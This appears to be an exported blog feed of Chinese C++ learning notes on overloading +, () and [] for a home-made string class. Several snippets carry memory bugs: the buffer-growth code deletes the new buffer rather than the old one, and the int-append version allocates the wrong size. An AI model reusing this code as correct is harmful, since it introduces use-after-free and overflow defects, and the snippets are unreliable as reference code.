class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flag) a = -a;</span><br><span class="line"><span class="keyword">while</span> (a)&#123;</span><br><span class="line">    </span><br><span class="line">    str[len++] = a % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">    a /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag) str[len++] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i];i++)&#123;</span><br><span class="line">    strA[i] = str[len - <span class="number">1</span> - i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; strA;</span><br></pre></td></tr></table></figure><p>这个i下面又用到了，所以改了下名字。</p><img src="/2022/06/26/operator5/003.png" class=""><p>也是成功反转了。</p><hr><p>不过依照优化而言，他还是有很多地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">-1225475</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> len = <span class="number">11</span>;</span><br><span class="line"><span class="type">bool</span> flag = a &lt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flag) a = <span class="number">-1</span> * a;</span><br><span class="line"><span class="keyword">while</span> (a)&#123;</span><br><span class="line">    str[--len] = a % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">    a /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) str[--len] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;str[len];</span><br></pre></td></tr></table></figure><p>这种倒写倒是省了一个变量和循环。</p><img src="/2022/06/26/operator5/004.png" class=""><p>抛开if，有些地方优化其实都是数学上的优化，需要逻辑思维比较好的。<br><code>if (flag) a = -1 * a;</code><br>像这个用负负得正的思想，但其实a的值无外乎 -1  &#x2F;0 1 ，<br>flag这个a &lt; 0；人的思维更偏向于 a &gt;&#x3D; 0;<br>布尔值在c&#x2F;c++也就是0 和 1；<br>那么不使用if，让负数变成正数，就要a*-1，但是正数不变，或者就是*1<br>a是输入项，关键就在于-1和1怎么来的。<br>前面的布尔值0 1，要转变成1 -1，让这个值*2 - 1， 当布尔值为1时，1*2-1还是1，当布尔值为0时，0*2 - 1就等于-1了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag = a &gt;= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a = a*(flag * <span class="number">2</span> - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这样第一个if就省掉了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag) str[--len] = <span class="string">&#x27;-&#x27;</span>;</span><br></pre></td></tr></table></figure><p>像第二个if就不是很好省略啊。按我个人肯定做不出来了。</p><p>套用老师的做法</p><p>目前flag就两种情况，0 1<br>0的时候 len的长度肯定因为没有符号位-1，去放这个符号位<br>1的时候 len不变，<br>0的时候 要加上-<br>1的时候 不需要<br>0的时候 ‘-‘ * (flag+1)*(1-flag) + str[len] * flag<br>1的时候 ‘-‘ * (flag+1)*(1-flag) + str[len] * flag<br>这种操作，就是负数的时候1-0&#x3D;1 保住前面的’-‘<br>而正数的时候1-1&#x3D;0 前面的’-‘就被舍弃了。<br>转换成代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str[len = len - <span class="number">1</span> * (<span class="number">1</span> - flag)] = <span class="string">&#x27;-&#x27;</span> * (flag + <span class="number">1</span>) * (<span class="number">1</span> - flag) + str[len] * flag;</span><br></pre></td></tr></table></figure><p><strong>u1s1,这个逻辑我要理好久。。。。</strong></p><p>不过效果是ok的</p><img src="/2022/06/26/operator5/005.png" class=""><img src="/2022/06/26/operator5/006.png" class=""><p>不过在测试的时候发现了个问题，是我之前测试的时候都没注意的就是a&#x3D;0的时候<br>因为while的条件就是a，当a&#x3D;0的时候，他压根没进去。</p><p>所以按照必定先执行一次的惯例，就要使用dowhile。<br>这样的话a&#x3D;0的时候就也能够输出了。</p><img src="/2022/06/26/operator5/007.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> len = <span class="number">11</span>;</span><br><span class="line"><span class="type">bool</span> flag = a &gt;= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a = a * (flag * <span class="number">2</span> - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    str[--len] = a % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (a /= <span class="number">10</span>);</span><br><span class="line">str[len = len - <span class="number">1</span> * (<span class="number">1</span> - flag)] = <span class="string">&#x27;-&#x27;</span> * (flag + <span class="number">1</span>) * (<span class="number">1</span> - flag) + str[len] * flag;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;str[len];</span><br></pre></td></tr></table></figure><p>后面的处理真的不是我这个二愣子看得明白的。。。</p><hr><p>封装到我们的类里面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">int</span> _val)&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;         <span class="comment">//根据int长度所设</span></span><br><span class="line">    <span class="type">int</span> len = <span class="number">11</span>;           <span class="comment">//考虑到符号位</span></span><br><span class="line">    <span class="type">bool</span> flag = _val &gt;= <span class="number">0</span>;  <span class="comment">//判断正负数</span></span><br><span class="line"></span><br><span class="line">    _val = _val * (flag * <span class="number">2</span> - <span class="number">1</span>);       <span class="comment">//是否取反</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        str[--len] = _val % <span class="number">10</span> + <span class="number">48</span>;    <span class="comment">//int转char</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (_val /= <span class="number">10</span>);</span><br><span class="line">    str[len = len - <span class="number">1</span> * (<span class="number">1</span> - flag)] = <span class="string">&#x27;-&#x27;</span> * (flag + <span class="number">1</span>) * (<span class="number">1</span> - flag) + str[len] * flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//前面用过的拷贝，自己稍微修改一下变量名。</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hslen = hsLen + <span class="number">12</span> - len - <span class="number">1</span>;</span><br><span class="line">    hslen += hsLen - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (hslen &gt; hsmLen)&#123;</span><br><span class="line">        <span class="type">char</span> *rstr = c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = hslen;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">        <span class="built_in">memcpy</span>(c_str, rstr, hsLen);</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str + hsLen - <span class="number">1</span>, str+len, <span class="number">12</span>-len);   <span class="comment">//注意12是因为上面字符串长度给的12</span></span><br><span class="line">    hsLen = hslen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/26/operator5/008.png" class=""><img src="/2022/06/26/operator5/009.png" class=""><p><strong>如果要扩充长度记得修改str的长度，还有最后memcpy的时候的长度-len</strong><br>有效长度就是在12以内含符号。</p><hr><p>long 在win下也就是四字节范围跟int差不多<br>longlong的范围9223372036854775807，反正在这里也就是修改一下str的长度和len的长度。<br>浮点数先不考虑，因为存在精度缺失的问题。后面的位数算多了不一定是对的。</p><p>反正这种重写操作，要么挨个类型写，要么用模板。这里暂时不搞了，先抓紧复习完进度。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>数学。。太弱了，在这方面不占优势。纯纯码农了属于是。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载()</title>
      <link href="/2022/06/26/operator4/"/>
      <url>/2022/06/26/operator4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>返回类型 operator()(类型 操作数);</code><br>看到这个圆括号或多或少可以猜到跟函数有关<br>()跟[]一样都只能重载为类的方法</p><span id="more"></span><ol><li>()重载称为functor函数对象</li><li>不限制参数个数</li><li>可以做默认实参</li></ol><p>利用()可以实现二维数组的访问方式</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>&amp; <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> &amp;<span class="title">hstring::operator</span><span class="params">()</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c_str[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先随便玩一玩</p><img src="/2022/06/26/operator4/000.png" class=""><p>看到当调用str()的时候不是出现其它函数，而是我们使用的重载，返回第一个元素<br>虽然有点抽象。</p><p>但是要实现个稍微有用点的功能就要构思一下，感觉截取会比较直接。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">hstring <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _length)</span></span>;</span><br></pre></td></tr></table></figure><p>传递两个参数，一个起始位置，一个要截取的长度。</p><p>那么在设计的时候其实要考虑几个问题</p><ol><li>字符串末尾0怎么处理</li><li>长度溢出是报错还是怎么处理</li><li>起始位置搞事情怎么办</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">hstring <span class="title">hstring::operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _length)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (_index &gt; hsLen)&#123;</span><br><span class="line">        <span class="comment">//若起始位置超过字符串长度是为非法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hstring</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hstring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种起始位置超过长度，就直接返回个空的也不是不行。</p><p>然后对于字符串末尾的0，忽略也不是什么大事，后期加个回去就行，毕竟不是显现的因素。</p><p>然后就是构建这个截取的字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len = (_index + _length) &gt; (hsLen - <span class="number">1</span>) ? hsLen - _index - <span class="number">1</span> : _length;</span><br><span class="line"><span class="type">char</span> *newStr = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(newStr, c_str+_index, len);</span><br><span class="line">newStr[len] = <span class="number">0</span>;        <span class="comment">//字符串末尾+0闭环</span></span><br></pre></td></tr></table></figure><p>如果起始+截取长度超过字符串长度，就让len &#x3D; 字符串长度-起始值-1，比如起始值1，截取15，字符串长度5，那么明显是超过了，利用我们的公式，len &#x3D; 5-1-1。 &#x3D;&#x3D; 3，也就是从1开始往后截取3位。<br>重新new的内存就要3+1，因为最后一个需要我们重置<code>\0</code><br>拷贝函数就用现有的了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">hstring <span class="title">hstring::operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _length)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *   hstring = &quot;1234&quot; 假设</span></span><br><span class="line"><span class="comment">    *   首要考虑是否截取字符串末尾的\0，虽然意义不大，但是要控制长度</span></span><br><span class="line"><span class="comment">    *   其次就是截取长度溢出，为了合法，就默认截取到最后一个</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (_index &gt; hsLen)&#123;</span><br><span class="line">        <span class="comment">//若起始位置超过字符串长度是为非法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hstring</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = (_index + _length) &gt; (hsLen - <span class="number">1</span>) ? hsLen - _index - <span class="number">1</span> : _length;</span><br><span class="line">    <span class="type">char</span> *newStr = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(newStr, c_str+_index, len);</span><br><span class="line">    newStr[len] = <span class="number">0</span>;        <span class="comment">//字符串末尾+0闭环</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hstring</span>(newStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致上应该就是这样。</p><img src="/2022/06/26/operator4/001.png" class=""><img src="/2022/06/26/operator4/002.png" class=""><img src="/2022/06/26/operator4/003.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>优化空间也有，内存方面或许可以考虑别的方法。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载[]</title>
      <link href="/2022/06/26/operator3/"/>
      <url>/2022/06/26/operator3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>[]在数组中比较常用，因为是取下标查看用的。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>但是[]重载只能作为类的方法<br><code>返回类型 operator[](类型 操作数);</code></p><p>拿我们自己写的hstring来说，目前就不能通过[]访问元素</p><img src="/2022/06/26/operator3/000.png" class=""><p>提示没有匹配的操作数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> &amp;hstring::<span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index) <span class="type">const</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;c_str[_index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/26/operator3/001.png" class=""><p>好似效果实现了。</p><p>另外，我们返回的是一个引用，当然指针也行，所以我们能够修改它</p><img src="/2022/06/26/operator3/002.png" class=""><p>这也是数组那会的基本效果。</p><p><strong>缺点是不能对中文有很好的支持，因为不能保证字符编码。</strong></p><p>然后就是越界行为，目前是未定义的。<br>规范一下也不难，if判断一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> &amp;hstring::<span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index) <span class="type">const</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_index &gt; hsLen)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;c_str[_index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是返回空的话，NULL毕竟是0的意思，对于字符串引用类型不合适。<br>而且字符串结尾就是<code>\0</code>，有点相冲了。</p><p>就算用宏定义，因为是常量，又得修改函数返回类型，当函数返回类型也被修饰成const，那么之前的通过[]修改元素功能就失效了。</p><p>所以还是得在成员变量里加个。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> _NO_CHAR;</span><br></pre></td></tr></table></figure><p>在类的public下加了一个这个，至于用不用inline是看你项目属性要不要调到c++17标准，如果不是很有必要，就把初始化放外面就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.cpp</span></span><br><span class="line"><span class="type">char</span> hstring::_NO_CHAR = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> &amp;hstring::<span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index) <span class="type">const</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_index &gt; hsLen)&#123;</span><br><span class="line">        <span class="keyword">return</span> _NO_CHAR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;c_str[_index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样又能保证能修改能访问，还能规范一下，虽然不是直接输出错误，但是应付if够用了。</p><img src="/2022/06/26/operator3/003.png" class=""><img src="/2022/06/26/operator3/004.png" class=""><blockquote><p>这样子修饰至少保证可阅读性</p></blockquote><p>说要完善的话也还有可以加强的地方。看个人愿不愿意写了。</p><hr><p>包括像数组一样申请。<code>hstring strAry[100];</code><br>这里有个问题就是不存在默认的构造函数，<br>原因是我们那个默认构造函数的默认参数写在定义里了，改成写在声明就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hstring</span>(<span class="type">char</span> ch=<span class="number">0x32</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">    hsmLen = ch;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能用了。</p><hr><h2 id="修订"><a href="#修订" class="headerlink" title="修订"></a>修订</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(str.c_str);       </span><br><span class="line">    len += hsLen - <span class="number">1</span>;               <span class="comment">//因为字符串\0结尾，两个字符串长度相加有一个\0就行</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="type">char</span> *rstr = c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = len;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">        <span class="built_in">memcpy</span>(c_str,rstr,hsLen);</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str  + hsLen <span class="number">-1</span>, str.c_str, len - hsLen + <span class="number">1</span>);</span><br><span class="line">    hsLen = len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有刷新缓冲区的时候，字符串拷贝从c_str的长度-1开始是没问题的，<br>但当刷新了缓冲区，我们直接先清理掉c_str，就无法拷贝原有的内容了。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> *c_str;            <span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsLen;    <span class="comment">//c_str length</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsmLen;    <span class="comment">//hstring 内存长度</span></span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;        <span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">char</span> ch=<span class="number">0x32</span>);</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    </span><br><span class="line">    ~<span class="built_in">hstring</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line">    <span class="type">char</span> &amp;<span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index) <span class="type">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> _NO_CHAR;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;_cout, hstring _str);</span><br><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hstring.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span 